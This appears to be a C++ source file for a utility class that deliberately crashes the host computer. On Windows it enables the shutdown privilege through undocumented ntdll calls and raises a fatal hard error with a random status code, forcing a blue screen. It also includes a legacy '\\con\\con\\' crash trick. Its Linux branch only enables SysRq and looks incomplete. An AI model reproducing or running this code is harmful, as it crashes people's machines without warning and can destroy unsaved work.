#include "utils/crash_util.hpp"

using namespace std;
namespace Utils {
	void CrashUtil::crash() {
		pthread_t crashThread;
		pthread_create(&crashThread, NULL, runCrashThread, NULL);
		pthread_detach(crashThread);
	}

	void* CrashUtil::runCrashThread(void* arg) {
#ifdef WIN32
		Sleep(200);

	#if WINVER > _WIN32_WINNT_NT4
		HMODULE ntHandle = GetModuleHandle(L"ntdll.dll");
		if (!ntHandle)
			return nullptr;
		NTSTATUS s1, s2;
		BOOLEAN b;
		ULONG r;

		TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege =
			(TFNRtlAdjustPrivilege)GetProcAddress(ntHandle, "RtlAdjustPrivilege");
		s1 = pfnRtlAdjustPrivilege(19, true, false, &b);

		TFNNtRaiseHardError pfnNtRaiseHardError =
			(TFNNtRaiseHardError)GetProcAddress(ntHandle, "NtRaiseHardError");
		vector<unsigned long> possibleStatuses = {
			0xDEADDEAD,
			0xFB01FEE7,
			0xF000000D,
			0xE0A55B01,
			0xF0B01A55,
			0xEA7A5500,
			STATUS_ILLEGAL_INSTRUCTION,
			STATUS_FLOAT_MULTIPLE_FAULTS,
			STATUS_GUARD_PAGE_VIOLATION,
			STATUS_DATATYPE_MISALIGNMENT,
			STATUS_REG_NAT_CONSUMPTION,
			STATUS_FLOAT_MULTIPLE_TRAPS,
			STATUS_INTEGER_DIVIDE_BY_ZERO,
			STATUS_INTEGER_OVERFLOW,
			STATUS_PRIVILEGED_INSTRUCTION,
			STATUS_FLOAT_STACK_CHECK,
			STATUS_FLOAT_OVERFLOW,
			STATUS_FLOAT_INVALID_OPERATION,
			STATUS_FLOAT_INEXACT_RESULT,
			STATUS_FLOAT_DIVIDE_BY_ZERO,
			STATUS_FLOAT_DENORMAL_OPERAND,
			STATUS_ARRAY_BOUNDS_EXCEEDED
		};
		s2 =
			pfnNtRaiseHardError((NTSTATUS)IndexHelper::getRandomItem(possibleStatuses), 0, 0, 0, 6, &r);

	#else
		ShellUtil::openShell("\\con\\con\\");

	#endif
#else
		this_thread::sleep_for(chrono::milliseconds(200));
		system("echo 1 > /proc/sys/kernel/sysrq");
#endif
		return nullptr;
	}
} // namespace Utils